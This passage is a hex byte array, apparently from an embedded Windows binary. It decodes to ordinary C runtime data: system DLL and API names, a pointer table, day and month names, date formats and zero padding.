0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x6f, 0x0, 0x63, 0x0, 0x61, 0x0, 0x6c, 0x0, 0x69, 0x0, 0x7a, 0x0, 0x61, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6f, 0x0, 0x62, 0x0, 0x73, 0x0, 0x6f, 0x0, 0x6c, 0x0, 0x65, 0x0, 0x74, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x72, 0x0, 0x6f, 0x0, 0x63, 0x0, 0x65, 0x0, 0x73, 0x0, 0x73, 0x0, 0x74, 0x0, 0x68, 0x0, 0x72, 0x0, 0x65, 0x0, 0x61, 0x0, 0x64, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x74, 0x0, 0x72, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x67, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x79, 0x0, 0x73, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x66, 0x0, 0x6f, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x72, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x78, 0x0, 0x73, 0x0, 0x74, 0x0, 0x61, 0x0, 0x74, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x32, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x72, 0x0, 0x74, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x75, 0x0, 0x73, 0x0, 0x65, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x6f, 0x0, 0x77, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x65, 0x0, 0x63, 0x0, 0x75, 0x0, 0x72, 0x0, 0x69, 0x0, 0x74, 0x0, 0x79, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x79, 0x0, 0x73, 0x0, 0x74, 0x0, 0x65, 0x0, 0x6d, 0x0, 0x66, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x63, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x78, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x75, 0x0, 0x73, 0x0, 0x65, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x64, 0x0, 0x69, 0x0, 0x61, 0x0, 0x6c, 0x0, 0x6f, 0x0, 0x67, 0x0, 0x62, 0x0, 0x6f, 0x0, 0x78, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x78, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x75, 0x0, 0x73, 0x0, 0x65, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x6f, 0x0, 0x77, 0x0, 0x73, 0x0, 0x74, 0x0, 0x61, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x64, 0x0, 0x76, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x33, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x64, 0x0, 0x6c, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x70, 0x0, 0x70, 0x0, 0x6d, 0x0, 0x6f, 0x0, 0x64, 0x0, 0x65, 0x0, 0x6c, 0x0, 0x2d, 0x0, 0x72, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6d, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x75, 0x0, 0x73, 0x0, 0x65, 0x0, 0x72, 0x0, 0x33, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x78, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x72, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x41, 0x70, 0x69, 0x73, 0x41, 0x4e, 0x53, 0x49, 0x0, 0x6, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x4c, 0x43, 0x4d, 0x61, 0x70, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x45, 0x78, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x65, 0x4e, 0x61, 0x6d, 0x65, 0x54, 0x6f, 0x4c, 0x43, 0x49, 0x44, 0x0, 0x0, 0x0, 0x0, 0x11, 0x0, 0x0, 0x0, 0x41, 0x70, 0x70, 0x50, 0x6f, 0x6c, 0x69, 0x63, 0x79, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x34, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x38, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3c, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x40, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x44, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x48, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x54, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x68, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x78, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x84, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9c, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa8, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xac, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb0, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xbc, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc0, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc8, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd8, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xec, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xac, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xfc, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x28, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x38, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x44, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x48, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x78, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x98, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa8, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x30, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x48, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x58, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x68, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x70, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x78, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x80, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x88, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x98, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa8, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe0, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x68, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf0, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x38, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x48, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x74, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7c, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x88, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc8, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe0, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x53, 0x75, 0x6e, 0x0, 0x4d, 0x6f, 0x6e, 0x0, 0x54, 0x75, 0x65, 0x0, 0x57, 0x65, 0x64, 0x0, 0x54, 0x68, 0x75, 0x0, 0x46, 0x72, 0x69, 0x0, 0x53, 0x61, 0x74, 0x0, 0x53, 0x75, 0x6e, 0x64, 0x61, 0x79, 0x0, 0x0, 0x4d, 0x6f, 0x6e, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0x75, 0x65, 0x73, 0x64, 0x61, 0x79, 0x0, 0x57, 0x65, 0x64, 0x6e, 0x65, 0x73, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0x68, 0x75, 0x72, 0x73, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x46, 0x72, 0x69, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x53, 0x61, 0x74, 0x75, 0x72, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x61, 0x6e, 0x0, 0x46, 0x65, 0x62, 0x0, 0x4d, 0x61, 0x72, 0x0, 0x41, 0x70, 0x72, 0x0, 0x4d, 0x61, 0x79, 0x0, 0x4a, 0x75, 0x6e, 0x0, 0x4a, 0x75, 0x6c, 0x0, 0x41, 0x75, 0x67, 0x0, 0x53, 0x65, 0x70, 0x0, 0x4f, 0x63, 0x74, 0x0, 0x4e, 0x6f, 0x76, 0x0, 0x44, 0x65, 0x63, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x61, 0x6e, 0x75, 0x61, 0x72, 0x79, 0x0, 0x46, 0x65, 0x62, 0x72, 0x75, 0x61, 0x72, 0x79, 0x0, 0x0, 0x0, 0x0, 0x4d, 0x61, 0x72, 0x63, 0x68, 0x0, 0x0, 0x0, 0x41, 0x70, 0x72, 0x69, 0x6c, 0x0, 0x0, 0x0, 0x4a, 0x75, 0x6e, 0x65, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x75, 0x6c, 0x79, 0x0, 0x0, 0x0, 0x0, 0x41, 0x75, 0x67, 0x75, 0x73, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x53, 0x65, 0x70, 0x74, 0x65, 0x6d, 0x62, 0x65, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4f, 0x63, 0x74, 0x6f, 0x62, 0x65, 0x72, 0x0, 0x4e, 0x6f, 0x76, 0x65, 0x6d, 0x62, 0x65, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x44, 0x65, 0x63, 0x65, 0x6d, 0x62, 0x65, 0x72, 0x0, 0x0, 0x0, 0x0, 0x41, 0x4d, 0x0, 0x0, 0x50, 0x4d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4d, 0x4d, 0x2f, 0x64, 0x64, 0x2f, 0x79, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x64, 0x64, 0x64, 0x2c, 0x20, 0x4d, 0x4d, 0x4d, 0x4d, 0x20, 0x64, 0x64, 0x2c, 0x20, 0x79, 0x79, 0x79, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x48, 0x3a, 0x6d, 0x6d, 0x3a, 0x73, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x53, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x54, 0x0, 0x75, 0x0, 0x65, 0x0, 0x0, 0x0, 0x57, 0x0, 0x65, 0x0, 0x64, 0x0, 0x0, 0x0, 0x54, 0x0, 0x68, 0x0, 0x75, 0x0, 0x0, 0x0, 0x46, 0x0, 0x72, 0x0, 0x69, 0x0, 0x0, 0x0, 0x53, 0x0, 0x61, 0x0, 0x74, 0x0, 0x0, 0x0, 0x53, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0x0, 0x75, 0x0, 0x65, 0x0, 0x73, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x57, 0x0, 0x65, 0x0, 0x64, 0x0, 0x6e, 0x0, 0x65, 0x0, 0x73, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0x0, 0x68, 0x0, 0x75, 0x0, 0x72, 0x0, 0x73, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x46, 0x0, 0x72, 0x0, 0x69, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x53, 0x0, 0x61, 0x0, 0x74, 0x0, 0x75, 0x0, 0x72, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x61, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x46, 0x0, 0x65, 0x0, 0x62, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x61, 0x0, 0x72, 0x0, 0x0, 0x0, 0x41, 0x0, 0x70, 0x0, 0x72, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x75, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x41, 0x0, 0x75, 0x0, 0x67, 0x0, 0x0, 0x0, 0x53, 0x0, 0x65, 0x0, 0x70, 0x0, 0x0, 0x0, 0x4f, 0x0, 0x63, 0x0, 0x74, 0x0, 0x0, 0x0, 0x4e, 0x0, 0x6f, 0x0, 0x76, 0x0, 0x0, 0x0, 0x44, 0x0, 0x65, 0x0, 0x63, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x61, 0x0, 0x6e, 0x0, 0x75, 0x0, 0x61, 0x0, 0x72, 0x0, 0x79, 0x0, 0x0, 0x0, 0x46, 0x0, 0x65, 0x0, 0x62, 0x0, 0x72, 0x0, 0x75, 0x0, 0x61, 0x0, 0x72, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x61, 0x0, 0x72, 0x0, 0x63, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x70, 0x0, 0x72, 0x0, 0x69, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x75, 0x0, 0x6c, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x75, 0x0, 0x67, 0x0, 0x75, 0x0, 0x73, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x53, 0x0, 0x65, 0x0, 0x70, 0x0, 0x74, 0x0, 0x65, 0x0, 0x6d, 0x0, 0x62, 0x0, 0x65, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4f, 0x0, 0x63, 0x0, 0x74, 0x0, 0x6f, 0x0, 0x62, 0x0, 0x65, 0x0, 0x72, 0x0, 0x0, 0x0, 0x4e, 0x0, 0x6f, 0x0, 0x76, 0x0, 0x65, 0x0, 0x6d, 0x0, 0x62, 0x0, 0x65, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x44, 0x0, 0x65, 0x0, 0x63, 0x0, 0x65, 0x0, 0x6d, 0x0, 0x62, 0x0, 0x65, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x4d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x0, 0x4d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x4d, 0x0, 0x2f, 0x0, 0x64, 0x0, 0x64, 0x0, 0x2f, 0x0, 0x79, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x64, 0x0, 0x64, 0x0, 0x64, 0x0, 0x2c, 0x0, 0x20, 0x0, 0x4d, 0x0, 0x4d, 0x0, 0x4d, 0x0, 0x4d, 0x0, 0x20, 0x0, 0x64, 0x0, 0x64, 0x0, 0x2c, 0x0, 0x20, 0x0, 0x79, 0x0, 0x79, 0x0, 0x79, 0x0, 0x79, 0x0, 0x0, 0x0, 0x48, 0x0, 0x48, 0x0, 0x3a, 0x0, 0x6d, 0x0, 0x6d, 0x0, 0x3a, 0x0, 0x73, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x55, 0x0, 0x53, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 